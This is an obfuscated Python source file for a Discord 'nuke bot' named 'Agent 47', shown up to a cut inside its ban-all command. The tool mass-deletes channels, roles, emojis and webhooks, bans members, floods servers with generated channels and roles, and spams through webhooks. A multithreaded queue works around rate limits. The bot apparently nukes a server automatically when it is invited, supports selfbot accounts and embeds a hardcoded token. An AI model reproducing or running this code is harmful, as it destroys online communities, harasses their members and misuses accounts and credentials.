BZ='do_not_disturb'
BY='idle'
BX='online'
BW='content'
BV='username'
BU='permission_overwrites'
BT='type'
BS='Channel bombing has started.'
BR='message'
BQ='ftps://'
BP='ftp://'
BO='No category.'
BN='...'
BM='help'
BL='application/json'
BK='content-type'
BJ='proxies'
BI=TypeError
BH=sorted
BG=KeyboardInterrupt
BF=EOFError
Au='b64'
At='Please insert an integer that is greater than 0.'
As='Please enter a positive integer.'
Ar='http://'
Aq='https://'
Ap='Invalid page number.'
Ao='Bad page number.'
An='data'
Am='dnd'
Al='token'
Ak=Exception
Aj=input
Ab='an'
Aa='offline'
AZ='\r'
AP='name'
AG='retry_after'
AF='verbose'
AE='utf8'
AD=open
A6='bot_status'
A5=isinstance
A0='remove'
z='add'
y='random'
x='bot_permission'
v='contents'
u='usernames'
r='list'
q='pfp_urls'
n='ban_whitelist'
p=hex
k=''
j=' '
i=range
f=':white_check_mark:'
e=':x:'
d='fixed'
c='after'
b='\n'
a='permissions'
Z=False
Y='bomb_messages'
V='1'
S='command_prefix'
Q='webhook_spam'
P=int
M=print
K=str
H=True
F=len
D=None
import discord as O,sys as w,requests as R,os as g,time
from discord.ext import commands as G
import asyncio as A3,urllib
from packaging import version as AH
from random import randint as h,choice as AQ,randrange as AR,random as Ac,choices as AS
from threading import Thread
from inputimeout import inputimeout as Av,TimeoutOccurred as Aw
from queue import Queue
from io import BytesIO as A1
from pathlib import Path as AT
from math import ceil as A4
from copy import deepcopy as Ad
if w.platform=='linux':import simplejson as l
else:import json as l
from colorama import init,Fore as I
init(autoreset=H)
__TITLE__='Agent 47'
__VERSION__='47.0.0'
__AUTHOR__=k
__LICENSE__=D
U=47
Ba=47
Bb=47
B=D
AI=[]
s=[]
AU=D
AJ=H
A7=H
A8=H
AV=H
AK=0
Bc=H
Ax=dict(((ord(A),D)for A in'<>:"\\/|?*'))
A9=H
def exit():
	try:Aj('Press enter to exit...')
	except (BF,BG):pass
	w.exit(1)
def Ay():w.stdout.buffer.write(f""" █████╗  ██████╗ ███████╗███╗   ██╗████████╗    ██╗  ██╗███████╗
██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝    ██║  ██║╚════██║
███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║       ███████║    ██╔╝
██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║       ╚════██║   ██╔╝ 
██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║            ██║   ██║  
╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝            ╚═╝   ╚═╝  
Code made by: Eren Yeager#5608
""".encode(AE))
if AH.parse('1.5.1')>AH.parse(O.__version__):M('Please update your discord.py.');exit()
C={Al:'ODk4OTY3MDAzMTMyNDY5MzAw'+'.YWr6Qw.'+'TFjBVWr731cMKqK-xebQN2ewerE',a:[],x:'2146958847',S:'<;',A6:Am,AF:15,Y:{y:D,d:[]},Q:{u:[],q:[],v:[]},c:[],BJ:[],n:['Eren Yeager#5608']}
def Az():
	from glob import glob;E=D;I=g.path.join(AT().absolute().__str__(),An);A=g.path.join(I,'default.json');B=glob(g.path.join(AT().absolute().__str__(),An,'*.json'))
	def G(choice,timeout):
		T='r';S='3';R='2';Q='|                       |';L='x';J='=========================';G=timeout;E=choice
		while H:
			M(J);M(Q);M('| [{0}] Load default.json |'.format(V if 1 in E else L));M('| [{0}] Select .json file |'.format(R if 2 in E else L));M('| [{0}] Create a new json |'.format(S if 3 in E else L));M(Q);M(J);M('[x] = not Available;')
			try:D=Av(prompt='Auto boot with choice [1] in %d seconds...\nChoose 1, 2, or 3\n>> '%G,timeout=G)
			except Aw:D=V
			if D==V:
				if not g.path.isfile(A):M(f"Unable to find file: {A}");continue
				with AD(A,T,encoding=AE)as I:
					try:return l.loads(I.read())
					except l.decoder.JSONDecodeError:M(f"There are some errors occured when reading the configuration file. File path -> {A}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...")
				break
			elif D==R:
				while H:
					M(J);M('0) Go back')
					for (N,O) in enumerate(B):M(f"{K(N+1)}) {O}")
					C=Aj('Select the .json file.\n>> ')
					if not C.isdigit()or not 0<=(C:=P(C))<=F(B):M(f"You need to enter an integer that is between or on 0 and {K(F(B))}");continue
					if C==0:G=999999;break
					with AD(B[C-1],T,encoding=AE)as I:
						try:return l.loads(I.read())
						except l.decoder.JSONDecodeError:M(f"There are some errors occured when reading the configuration file. File path -> {A}\nI recommend you use https://jsonlint.com/?code= to help checking the configuration file. Skipping reading the default.json file...")
			elif D==S:break
	global C,AA
	if g.path.isfile(A):E=G([1,2,3],5)
	elif F(B)>0:E=G([2,3],999999);J=C[Al]
	if E is not D:C.update(E)
	else:
		try:C[a].append(Aj('\nEnter your discord tag or user ID. It is recommended to use discord user ID because some unicode names are hard for the code to check.\n>> '))
		except BG:w.exit(0)
		except BF:M('Invalid input/EOFError. This may be caused by some unicode.');exit()
	M('\nTips:');M('The default command_prefix is: <;');M(f"Your currect command_prefix is: {C[S]}");M(f"Use {C[S]}config to config the settings and more info about how to config.\n");M('Note: If you claim this is yours. Your server will be killed');AA=Ad(C)
Az()
AB=AL=AM=AN=0
def Ae():global AB,AL,AM,AN;A=C[AF];AB=A&1<<0;AL=A&1<<1;AM=A&1<<2;AN=A&1<<3
Ae()
t=H
W={}
def A_(token=D):
	F='Invalid token is being used.';E='https://discord.com/api/v8/users/@me';C='id';B='authorization';A=token
	if A is D:A=A
	global t,W
	try:
		W={B:A,BK:BL};M('Checking selfbot token.',end=AZ)
		if not C in R.get(url=E,timeout=AK,headers=W).json():
			W[B]='Bot '+A;M('Checking normal bot token.',end=AZ)
			if not C in R.get(url=E,timeout=AK,headers=W).json():M(F);exit()
			else:t=Z
	except R.exceptions.ConnectionError:M("You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don't what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.");exit()
	except (R.exceptions.InvalidHeader,l.decoder.JSONDecodeError):M(F);exit()
A_()
M('Checking update...           ',end=AZ)
Af=R.get('https://raw.githubusercontent.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot/master/VERSION.txt').text
if AH.parse(Af)>AH.parse(__VERSION__):M(f"New C-REAL update has been launched -> {Af} <- :party:")
M('Loading scripts...'+j*15,end=AZ)
async def Bd(bot,message):return C[S]
E=G.Bot(command_prefix=C[S],case_insensitive=H,self_bot=t,intents=O.Intents().all())
E.remove_command(BM)
@E.event
async def Be():
	if t:
		for A in C[a]:
			if K(E.user.id)==A or f"{E.user.name}#{E.user.discriminator}"==A:global AV;AV=H
		C[a].append(K(E.user.id))
	global AI;AI=BH(E.commands,key=lambda e:e.name[0]);await AY(D,C[A6])
@E.event
async def Bf():
	Ay();M('/+========================================================');M(f"| | {I.GREEN}Bot ready.");M(f"| {I.MAGENTA}+ Logged in as");M(f"| | {E.user.name}#{E.user.discriminator}");M(f"| | {E.user.id}");M(f"| {I.MAGENTA}+ Permission given to ")
	for A in C[a]:M(f"| | {A}")
	M(f"| {I.MAGENTA}+ Command prefix: "+C[S])
	if t:M(f"| {I.YELLOW}+ [Selfbot] This is a selfbot. Join servers with join codes.")
	else:M(f"| {I.YELLOW}+ https://discord.com/api/oauth2/authorize?client_id={E.user.id}&permissions={C[x]}&scope=bot")
	M('| ~*************************************');M('\\+-----')
@E.event
async def Bg():await AY(D,Aa)
async def A(ctx,message):
	B=message
	if AM:
		try:await ctx.send(B)
		except O.errors.HTTPException:
			for C in i(A4(F(B)/2000)):await A(ctx,B[2000*C:2000*(C+1)])
		except:L(B)
def L(message,print_time=Z):
	B=message
	if AL:
		A=k
		if print_time:A=f"{I.MAGENTA}[{time.strftime('%H:%M:%S',time.localtime())}] {I.RESET}"
		try:M(f"{A}{B}")
		except BI:w.stdout.buffer.write(f"{A}{B}".encode(AE))
@E.event
async def Bh(ctx,error):
	C=ctx;B=error
	if not AN or hasattr(C.command,'on_error'):return
	B=getattr(B,'original',B)
	if A5(B,G.CommandNotFound):
		if J(C):
			try:await A(C,f"Command `{C.message.content}` is not found.")
			except O.errors.HTTPException:await A(C,'That command is not found.')
	elif A5(B,G.CheckFailure):0
	elif A5(B,O.Forbidden):await A(C,f"403 Forbidden: Missing permission.")
	elif A5(B,O.errors.HTTPException):0
	elif A5(B,G.UserInputError):await A(C,'Invalid input.')
	else:
		try:await A(C,'%s'%B.args)
		except O.errors.NotFound:pass
		except BI:L(f'{I.RED}Error -> {B.args}: {I.YELLOW}When using "{C.message.content}".',H)
if t:
	@E.event
	async def Bi(message):
		A=message
		if A.content.startswith(C[S])and J(await E.get_context(A)):
			if A.author.id==E.user.id and not AV:L(f'{I.YELLOW}Account owner {I.LIGHTBLUE_EX}"{E.user.name}#{E.user.discriminator}" {I.YELLOW}tried to use {I.LIGHTBLUE_EX}"{A.content}"{I.BLUE}. Too bad, he/she doesn\'t of the power to use this bot.',H);return
			A.author=E.user;await E.process_commands(A)
@E.event
async def Bj(guild):
	if AJ:global B;B=guild;await B7(AU)
def A2(ctx):return A5(ctx.channel,O.channel.DMChannel)
def AO(name):
	A=name
	if A.startswith('<@!')or A.startswith('<@&'):return A[:-1][3:]
	return A
async def m(ctx,n,title,array):
	N=array;L=title;E=ctx
	if not n.isdigit()or(n:=P(n)-1)<0:await A(E,Ao);return
	C=k;G=k;B=F(N)
	if B==0:return await E.send(f"{L} count: 0")
	D=n*U;M=D+U
	if D>B-U:
		if D>B:await E.send(Ap);return
		M=D+B%U
	else:M=D+U
	for R in i(D,M,1):
		I=N[R]
		if F(I.name)>17:I.name=I.name[:17]+BN
		C+=f"{I.name}\n";G+=f"{K(I.id)}\n "
	try:Q=h(0,16777215);J=O.Embed(title=L,description=f"Total count: {K(B)}; color: #{p(Q)[2:].zfill(6)}",color=Q);J.add_field(name='Name',value=C,inline=H);J.add_field(name='ID',value=G,inline=H);J.set_footer(text=f"{n+1}/{K(A4(B/U))}");await E.send(embed=J)
	except:C=C.split(b);G=G.split(j);await E.send(f"```*{L}*\nTotal count: {K(B)}\n__Name__{j*13}__ID__\n{k.join([C[A].ljust(21)+G[A]for A in i(F(C)-1)])}{n+1}/{K(A4(B/U))}```")
async def N(ctx):
	E=ctx
	if B is not D:return H
	elif not A2(E):await B1(E);await A(E,f"You have been automatically `{C[S]}connect` to server `{B.name}` because you are not connected to a server and using a command inside a server.");return H
	else:await A(E,f"I am not connected to a server. Try `{C[S]}servers` and `{C[S]}connect`");return Z
def X(a,b):
	for A in a:
		if A.name.lower()==b.lower()or K(A.id)==b:return A
	return D
def J(ctx):
	A=ctx
	if A9:return H
	for B in C[a]:
		if K(A.author.id)==B or f"{A.author.name}#{A.author.discriminator}"==B:return H
	if not A2(A):L(f'{I.LIGHTRED_EX}{A.author.name}#{A.author.discriminator} {I.RESET}tried to use {I.LIGHTYELLOW_EX}"{A.message.content}" {I.RESET}in server {I.LIGHTYELLOW_EX}"{A.guild.name}"{I.RESET}, at channel {I.LIGHTYELLOW_EX}"{A.channel.name}"{I.RESET}.',H)
	else:L(f'{I.LIGHTRED_EX}{A.author.name}#{A.author.discriminator} {I.RESET}tried to use {I.LIGHTYELLOW_EX}"{A.message.content}" {I.RESET}in {I.LIGHTYELLOW_EX}the bot\'s direct message{I.RESET}.',H)
	return Z
def AW():return C[Y][d][h(0,F(C[Y][d])-1)]
B0='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
def AC(n=0):return k.join(AS(B0,k=C[Y][y]if n==0 else n))
Ag='0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
def AX():return k.join(AS(Ag,k=C[Y][y]))
def Bk(ctx):0
def Bl(ctx):
	if A2(ctx):return H
def o():return AA==C
@G.check(J)
@E.command(name=BM,aliases=['h','commands'])
async def help(ctx,asked_command=D):
	M='```';H=asked_command;G=ctx;J=M
	if H is D:
		for B in AI:J+=f"[{B.name}] "
		await G.send(J+f"\n\nYou can try {C[S]}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```")
	else:
		for B in AI:
			if H.lower()==B.name.lower():
				E=f"```{C[S]}<{B.name}"
				for L in B.aliases:E+=f"|{L}"
				E+='>'
				for (I,F) in B.params.items():
					if I=='ctx':continue
					if F.empty is not F.default:E+=' {'+I+'='+K(F.default)+'}'
					else:E+=' ['+I+']'
					if F.kind.name=='KEYWORD_ONLY':break
				E+=M;await G.send(E);return
		await A(G,f"Unable to find command `{H}`.")
@G.check(J)
@E.command(name='servers',aliases=['se','server'])
async def Bm(ctx,n=V):await m(ctx,n,'Servers',E.guilds)
@G.check(J)
@E.command(name='channels',aliases=['tc','textchannels','textchannel','channel'])
async def Bn(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Text channels',B.text_channels)
@G.check(J)
@E.command(name='roles',aliases=['ro','role'])
async def Bo(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Roles',B.roles)
@G.check(J)
@E.command(name='categories',aliases=['cat','category'])
async def Bp(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Categories',B.categories)
@G.check(J)
@E.command(name='voiceChannels',aliases=['vc','voicechannel'])
async def Bq(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Voice channels',B.voice_channels)
@G.check(J)
@E.command(name='emojis',alises=['em','emoji'])
async def Br(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Emojis',B.emojis)
@G.check(J)
@E.command(name='members',alises=['me','member'])
async def Bs(ctx,command=V,*,args=D):
	if not await N(ctx):return
	M(F(B.members));await m(ctx,command,'Members',B.members)
@G.check(J)
@E.command(name='bans')
async def Bt(ctx,n=V):
	if not await N(ctx):return
	await m(ctx,n,'Bans',[A.user for A in await B.bans()])
@G.check(J)
@E.command(name='connect',aliases=['con'])
async def B1(ctx,*,server=D):
	F=ctx;C=server
	if C is D and F.guild is D:await A(F,f"Providing a server name is required.");return
	if C is D and not A2(F):C=F.guild
	else:
		G=C;C=X(E.guilds,C)
		if C is D:await A(F,f"Unable to find {G} server.");return
	global B;B=C;await A(F,f"Successfully connected to `{C.name}`.")
@G.check(J)
@E.command(name='addChannel',aliases=['aCh','aChannel'])
async def Bu(ctx,channel_name,*,category=D):
	F=channel_name;E=ctx;C=category
	if not await N(E):return
	if C is not D:
		G=C;C=X(B.categories,C)
		if C is D:await A(E,f"Unable to find category `{G}`.");return
	try:
		await B.create_text_channel(F,category=C)
		if C is D:C=BO
		else:C=C.name
		await A(E,f"Successfully added channel `{F}` to category `{C}`.")
	except:await A(E,f"Unable to add channel `{F}`.");raise
@G.check(J)
@E.command(name='addVoiceChannel',aliases=['aVoiceChannel','aVC'])
async def Bv(ctx,voice_channel,*,category=D):
	F=voice_channel;E=ctx;C=category
	if not await N(E):return
	if C is not D:
		G=C;C=X(B.categories,C)
		if C is D:await A(E,f"Unable to find category `{G}`.");return
	try:
		await B.create_voice_channel(F,category=C)
		if C is D:C=BO
		else:C=C.name
		await A(E,f"Successfully added VC `{F}` to category `{C}`.")
	except:await A(E,f"Unable to add VC `{F}`.");raise
@G.check(J)
@E.command(name='addEmoji',aliases=['aEmoji','aEm'])
async def Bw(ctx,item,*,name=D,bits=D):
	F=ctx;E=name;C=item
	if not await N(F):return
	if bits is D:
		if C.startswith((Aq,Ar,BP,BQ)):
			try:
				if E is D:await A(F,"Name for emoji? I'm not always going to name it for you...");return
				await B.create_custom_emoji(name=E,image=A1(R.get(C).content).read());await A(F,f"Successfully added emoji `{E}`.")
			except:raise
		elif C[0]=='<':
			C=C.split(':')
			if E is D:E=C[1]
			try:
				if C[0]=='<a':await B.create_custom_emoji(name=E,image=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.gif?v=1").content).read())
				else:await B.create_custom_emoji(name=E,image=A1(R.get(f"https://cdn.discordapp.com/emojis/{C[2][:-1]}.png?v=1").content).read())
				await A(F,f"Successfully added emoji: {E}")
			except:raise
		elif g.path.isfile(C):
			with AD(C,'rb')as G:await B.create_custom_emoji(name=E,image=G.read());await A(F,f"Successfully added emoji: {E}")
		else:await A(F,'Bad path to image.')
	else:B.create_custom_emoji(name=E,image=bits)
@G.check(J)
@E.command(name='addCategory',aliases=['aCat','aCa'])
async def Bx(ctx,*,category_name):
	D=category_name;C=ctx
	if not await N(C):return
	try:await B.create_category(D);await A(C,f"Successfully created category `{D}`.")
	except:await A(C,f"Unable to create category `{D}`.");raise
@G.check(J)
@E.command(name='addRole',aliases=['aRole','aR'])
async def By(ctx,*,name):
	D=ctx;C=name
	if not await N(D):return
	try:C=C.split();E=C.pop(-1);await B.create_role(name=j.join(C),permissions=O.Permissions(permissions=P(E)));await A(D,f"Successfully added role `{C}` with permission `{E}`.")
	except:await A(D,f"Failed to add role `{C}`.");raise
@G.check(J)
@E.command(name='moveRole',aliases=['mRole','mR'])
async def Bz(ctx,*,name):
	E=ctx;C=name
	if not await N(E):return
	try:
		C=C.split();G=C.pop(-1);C=j.join(C)
		if F(C)==0 or not G.isdigit():await A(E,'Invalid inputs.');return
		H=X(B.roles,C)
		if H is D:await A(E,f"Unable to find role `{C}`.")
		await H.edit(position=P(G));await A(E,f"Successfully moved role {H.name} to position `{K(G)}`.")
	except:await A(E,f"Unable to move role `{C}` to position `{G}`.");raise
@G.check(J)
@E.command(name='deleteRole',aliases=['dRole','dR'])
async def B_(ctx,*,name):
	C=ctx
	if not await N(C):return
	E=X(B.roles,name)
	if E is D:await A(C,f"Unable to find `{name}`.")
	try:await E.delete();await A(C,f"Successfully removed role `{E.name}`")
	except:await A(C,f"Unable to delete role `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteChannel',aliases=['dChannel','dCh'])
async def C0(ctx,channel_name):
	F=channel_name;C=ctx
	if not await N(C):return
	E=X(B.text_channels,F)
	if E is D:await A(C,f"Unable to find text channel `{F}`.")
	try:await E.delete(reason=D);await A(C,f"Channel `{E.name}` is deleted.")
	except:await A(C,f"Unable to delete channel `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteVoiceChannel',aliases=['dVC','dVoiceChannel'])
async def C1(ctx,VC_name):
	F=VC_name;E=ctx
	if not await N(E):return
	C=X(B.voice_channels,F)
	if C is D:await A(E,f"Unable to find voice channel `{F}`.")
	try:await C.delete(reason=D);await A(E,f"Voice channel `{C.name}` is deleted.")
	except:L(f"Unable to delete voice channel `{C.name}`.");raise
@G.check(J)
@E.command(name='deleteCategory',aliases=['dCat','dCategory'])
async def C2(ctx,*,category_name):
	F=category_name;C=ctx
	if not await N(C):return
	E=X(B.categories,F)
	if E is D:await A(C,f"Unable to find category `{F}`.")
	try:await E.delete(reason=D);await A(C,f"Category `{E.name}` is deleted.")
	except:await A(C,f"Unable to delete category `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteCC',aliases=['dCC'])
async def C3(ctx,*,name):
	C=ctx
	if not await N(C):return
	E=X(B.channels,name)
	if E is D:await A(C,f"Unable to find channel `{name}`.");return
	try:await E.delete(reason=D);await A(C,f"Channel `{E.name}` is removed from `{B.name}`.")
	except:await A(C,f"Unable to delete channel `{E.name}`.");raise
@G.check(J)
@E.command(name='deleteEmoji',aliases=['dEm'])
async def C4(ctx,*,name):
	E=ctx;C=X(B.emojis,name)
	if C is D:await A(E,f"Unable to find channel `{name}`.")
	try:await C.delete(reason=D);await(E,f"Emoji `{C.name}` is removed from the server.")
	except:await A(E,f"Unable to delete emoji: `{C.name}`.");raise
@G.check(J)
@E.command(name='ban')
async def C5(ctx,member_):
	C=ctx;B=member_
	if not await N(C):return
	try:await B.ban();await A(C,f"Successfully banned `{B.name}#{B.discriminator}`.")
	except:await A(C,f"Unable to ban `{B.name}#{B.discriminator}`.");raise
@G.check(J)
@E.command(name='unban')
async def C6(ctx,*,name):
	E=ctx
	if not await N(E):return
	C=X([A.user for A in await B.bans()],AO(name))
	if C is D:await A(E,f"Unable to find user `{name}` in server `{B.name}`.");return
	try:await B.unban(C);await A(E,f"`{C.name}#{C.discriminator}` is now free :).")
	except:await A(E,f"Failed to unban `{C.name}#{C.discriminator}`.");raise
@G.check(J)
@E.command(name='roleTo')
async def C7(ctx,member_name,*,role_name):
	H=role_name;G=member_name;F=ctx
	if not await N(F):return
	C=X(B.roles,AO(H))
	if C is D:await A(F,f"Unable to find role `{H}`.");return
	E=X(B.members,AO(G))
	if E is D:await A(F,f"Unable to find user `{G}`.");return
	if C in E.roles:
		try:await E.remove_roles(C);await A(F,f"Successfully removed role `{C.name}` from user `{E.name}`.")
		except:await A(F,f"Unable to remove role `{C.name}` from user `{E.name}`.");raise
	else:
		try:await E.add_roles(C);await A(F,f"Successfully given role `{C.name}` to user `{E.name}`.")
		except:await A(F,f"Unable to add role `{C.name}` to user `{E.name}`.");raise
@G.check(J)
@E.command(name='disableCommunityMode',aliases=['dCM','dCommunityMode'])
async def B2(ctx):
	C=ctx
	if not await N(C):return
	try:await A(C,f"{I.YELLOW}Disabling community mode");E=R.patch(f"https://discord.com/api/v8/guilds/{B.id}",headers=W,json={'description':D,'features':{'0':'NEWS'},'preferred_locale':'en-US','public_updates_channel_id':D,'rules_channel_id':D});L(f"Disabling community mode response -> {E.text}",H);await A(C,f"{I.GREEN}Disabled community mode.")
	except Ak as F:L(f"{I.RED}Error while attempting to disable community mode, {F}",H);raise
@G.check(J)
@E.command(name='grantAllPerm',aliases=['gap'])
async def C8(ctx):
	global A9
	if A9:await A(ctx,'Now only people with permissions can use the commands.');A9=Z
	else:await A(ctx,'Now everyone can use the bot commands');A9=H
@G.check(J)
@E.command(name='kaboom')
async def C9(ctx,n,method):
	D=method;C=ctx
	if not await N(C):return
	if not n.isdigit()or P(n)<0:await A(C,As);return
	await A(C,f"A series of bombs have been dropped onto `{B.name}`.");E=[B4(C,n,D),B5(C,n,D),B6(C,n,D)];await A3.gather(*E)
Ah=100
T=Queue(Ah*2)
def B3():
	while H:
		B,C,D,E=T.get()
		try:
			A=B(C,data=l.dumps(E),headers=D,timeout=AK)
			if A.status_code==429:
				A=A.json()
				if AB:
					if A5(A[AG],P):A[AG]/=1000
					if A[AG]>5:L(f"Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {K(A[AG])} more seconds.");T.task_done();continue
					L(f"Rate limiting has been reached: Wait {K(A[AG])} more seconds.")
				T.put((B,C,D,E))
			elif AB and'code'in A:L('Request cancelled due to -> '+A[BR])
		except l.decoder.JSONDecodeError:pass
		except R.exceptions.ConnectTimeout:L(f"Reached maximum load time: timeout is {AK} seconds long {proxy}");T.put((B,C,D,E))
		except Ak as F:L(f"Unexpected error: {K(F)}")
		T.task_done()
for CA in i(Ah):Thread(target=B3,daemon=H).start()
@G.check(J)
@E.command(name='channelBomb')
async def B4(ctx,n,method=d):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,At);return
	if C==d:C=AW
	elif C==Au:C=AC
	elif C==Ab:C=AX
	else:await A(D,f'Unable to find choice "{C}".');return
	L(BS,H)
	for F in i(n):E={BT:0,AP:C(),BU:[]};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/channels",W,E))
	T.join();L('Done text channel bombing.',H)
@G.check(J)
@E.command(name='categoryBomb')
async def B5(ctx,n,method):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,At);return
	if C==d:C=AW
	elif C==Au:C=AC
	elif C==Ab:C=AX
	else:await A(D,f'Unable to find choice "{C}".');return
	L(BS,H)
	for F in i(n):E={BT:4,AP:C(),BU:[]};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/channels",W,E))
	T.join();L('Done category bombing.',H)
@G.check(J)
@E.command(name='roleBomb')
async def B6(ctx,n,method):
	D=ctx;C=method
	if not await N(D):return
	if not n.isdigit()or(n:=P(n))<0:await A(D,At);return
	if C==d:C=AW
	elif C==Au:C=AC
	elif C==Ab:C=AX
	else:await A(D,f'Unable to find choice "{C}".');return
	L('Role bombing has started.',H)
	for F in i(n):E={AP:C()};T.put((R.post,f"https://discord.com/api/v8/guilds/{B.id}/roles",W,E))
	T.join();L('Done role bombing.',H)
@G.check(J)
@E.command(name='webhook',aliases=['webhooks','wh'])
async def CB(ctx,*,args=D):
	e='offload';d='start';G=ctx;E=args
	if not await N(G):return
	if E is D or E.isdigit():
		if E is D:E=V
		try:await m(G,E,'Webhooks',await B.webhooks());return
		except:raise
	E=E.split()
	if E[0]=='create'or E[0]==z:
		del E[0]
		if F(E)<1:await A(G,f"More arguments is requested. You can put how many webhooks you want to create or channel id/name on the channels you want the webhooks to be created on.");return
		H=j.join(E);L=await B.webhooks();O=F(L);J=H.split()
		if P(H)<0:await A(G,f"You thought a smol negative number will break this bot?");return
		if F(J)==1 and P(H)<=50:
			J=B.text_channels
			if P(H)>F(J):await A(G,f"This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{H}`, and there are only `{K(F(J))}` text channel(s) in the server. If you don't what to add more text channels. You can use this command a few more times with a positive integer that is less than `{K(F(J)+1)}`.");return
			for Y in i(P(H)):M={AP:AC(10)};T.put((R.post,f"https://discord.com/api/v8/channels/{J.pop(AR(F(J))).id}/webhooks",W,M))
			T.join();await A(G,f"`{H}` webhooks has been created.")
		elif F(J)==1 and P(H)<100000000:await A(G,f"The maximum webhooks that can be created every hour per server is 50. And you entered `{H}`.")
		else:
			for Z in J:
				a=X(B.text_channels,Z)
				if a is D:await A(G,f"Cannot find channel {Z}.");continue
				M={AP:AC(10)};T.put((R.post,f"https://discord.com/api/v8/channels/{a.id}/webhooks",W,M))
	elif E[0]=='delete'or E[0]==A0:
		H=E[1];I=X(await B.webhooks(),H)
		if I is D:await A(G,f"Unable to find webhook `{H}`.");return
		R.delete(f"https://discord.com/api/v8/webhooks/{I.id}",headers=W);await A(G,f"Webhook `{I.name}` is removed from the server.")
	elif E[0]=='attack':
		global s;E.pop(0)
		try:
			L=await B.webhooks();O=F(L);U=0
			if F(E)>0 and E[0].lower()=='all':
				for I in L:s.append(I);U+=1
			elif E[0]==d:
				b=F(s)
				if b==0:await A(G,f"Looks like there really isn't any targets in the attack list. Maybe try: `{C[S]}webhook attack all`, then `{C[S]}webhook attack start <number of messages>`.");return
				c={BK:BL}
				if F(E)<2:E.append(10)
				elif not E[1].isdigit():await A(G,As);return
				f=F(C[Q][u]);g=F(C[Q][v]);h=F(C[Q][q])
				for Y in i(P(E[1])):M={BV:AQ(C[Q][u]),BW:AQ(C[Q][v]),'avatar_url':AQ(C[Q][q])};T.put((R.post,s[AR(b)].url,c,M))
			elif F(E)>0 and E[0].isdigit()and P(E[0])<=O:
				for Y in i(P(E[0])):s.append(L.pop(AR(O)));O-=1;U+=1
			elif E[0]==r:
				if F(E)<2:E.append(V)
				await m(G,E[1],'Targets on attacking list',s)
			elif E[0]==e:s=[];await A(G,f"All webhooks have been offloaded")
			else:
				for I in E:
					I=X(await B.webhooks(),I)
					if I is D:await A(G,f"Unable to find webhook `{I}`.");continue
					s.append(I);U+=1
			if E[0]!=r and E[0]!=d and E[0]!=e:await A(G,f"`{K(U)}` has been loaded into the target list.")
		except:raise
	else:await A(G,f"Unable to find `{E[0]}` command in webhook scripts.")
@G.check(J)
@E.command(name='nuke')
async def B7(ctx):
	G=ctx
	if not await N(G):return
	await A(G,f"A nuke has been launched to `{B.name}`.");K=[B2(G),B9(G),B8(G),BC(G),BB(G),BA(G)];await A3.gather(*K)
	if F(C[c])>0:
		if not A2(G)and B.id==G.guild.id:G.message.channel=D
		L(f"{I.BLUE}Running after commands...",H)
		for J in C[c]:
			try:G.message.content=C[S]+J;await E.process_commands(G.message)
			except:L(f'{I.RED}Command {I.YELLOW}"{C[S]}{J}" {I.RED}has failed to execute.',H);pass
		L(f"{I.GREEN}After commands completed.")
@G.check(J)
@E.command(name='deleteAllRoles',aliases=['dar','dAllRoles'])
async def B8(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all roles...",H)
	for A in B.roles:T.put((R.delete,f"https://discord.com/api/v8/guilds/{B.id}/roles/{A.id}",W,D))
	T.join();L(f"{I.GREEN}Finished deleting roles.",H)
@G.check(J)
@E.command(name='deleteAllChannels',aliases=['dac','dAllChannels'])
async def B9(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all types of channels...",H)
	for A in B.channels:T.put((R.delete,f"https://discord.com/api/v8/channels/{A.id}",W,D))
	T.join();L(f"{I.GREEN}Finished deleting channels.",H)
@G.check(J)
@E.command(name='deleteAllEmojis',aliases=['dae','dAllEmoji'])
async def BA(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all emojis...",H)
	for A in B.emojis:T.put((R.delete,f"https://discord.com/api/v8/guilds/{B.id}/emojis/{A.id}",W,D))
	T.join();L(f"{I.GREEN}Finished deleting emojis.",H)
@G.check(J)
@E.command(name='deleteAllWebhooks',aliases=['daw','dAllWebhooks'])
async def BB(ctx):
	if not await N(ctx):return
	L(f"{I.YELLOW}Starting to delete all webhooks...",H)
	for A in await B.webhooks():T.put((R.delete,f"https://discord.com/api/v8/webhooks/{A.id}",W,D))
	T.join();L(f"{I.GREEN}Finished deleting webhooks.",H)
@G.check(J)
@E.command(name='banAll')
async def BC(ctx):
	if not await N(ctx):return
	D={'delete_message_days':'0','reason':k};L(f"{I.YELLOW}Starting ban all...",H)
	for A in B.members:
